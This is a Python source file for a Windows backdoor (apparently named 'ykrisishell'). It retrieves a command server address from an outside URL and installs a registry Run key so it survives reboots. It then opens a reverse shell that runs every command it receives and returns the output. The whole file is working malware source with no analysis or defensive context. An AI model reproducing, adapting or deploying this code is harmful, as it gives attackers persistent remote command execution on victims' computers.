import socket, subprocess, sys, os, time, urllib
import xml.dom.minidom
from _winreg import *

def recupUrl():
    URL="https://frompixel.com/recept/test.txt"
    try:
        host = urllib.urlopen(URL).read()
    except:
        host = "192.168.69.69"
    port = 1122
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global host
    global port
    global sock

def percistance (tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))
    path = os.environ["TEMP"]
# Queries Windows registry for key values
# Appends autorun key to runkey array
    key = OpenKey(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run')
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

# Set autorun key:
    try:
        key= OpenKey(HKEY_CURRENT_USER, run,0,KEY_ALL_ACCESS)
        SetValueEx(key,'ykrisishell',0,REG_SZ,path+"\ykrisishell.exe")
        key.Close()
    except WindowsError:
        pass

def recevCommand():
    while True:
        commande =  sock.recv(4096)
        if 'quitter' in commande:
            # print 'Fermeture de la connexion'
            sock.close()
            break
        else:
            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                sock.send(shell.stdout.read() + shell.stderr.read())
            finally:
                sock.send("ok")
def Connect():
    try:
        sock.connect((host, port))
        recevCommand()
    except Exception as e:
        print("something's wrong with %s:%d. Exception is %s" % (host, port, e))
    finally:
        print 'pas de co'

def Main ():
    time.sleep(60)
    tempdir = os.environ["TEMP"]
    fileName = sys.argv[0]
    run = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    percistance(tempdir, fileName, run)
    while True:
        time.sleep(30)
        recupUrl()
        Connect()
Main()
